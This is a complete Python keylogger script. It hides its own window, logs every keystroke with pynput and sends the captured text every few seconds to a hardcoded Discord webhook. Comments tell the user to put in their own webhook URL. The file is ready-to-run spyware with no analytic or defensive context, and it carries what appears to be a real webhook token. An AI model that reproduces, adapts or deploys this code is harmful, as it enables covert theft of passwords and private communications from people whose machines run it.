from pynput.keyboard import Listener
from threading import Timer
from dhooks import Webhook
import win32gui
import win32con
win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)


WEBHOOK_URL = "https://discord.com/api/webhooks/1001245209541226587/TLheWj3BKvWMC8-0d1jBGo8ED0If8qN9gXwXe7B1S2ztsEdDT8b3QEv2iVdUEMrDtiRv"  # Your discord webhook url goes here.
TIME_INTERVAL = 10  # You can set the amount of time between each report


class Keylogger:
    def __init__(self, webhook_url, interval=60):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _report(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.interval, self._report).start()

    def _on_key_press(self, key):
        self.log += str(key)

    def run(self):
        self._report()
        with Listener(self._on_key_press) as t:
            t.join()


if __name__ == '__main__':
    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
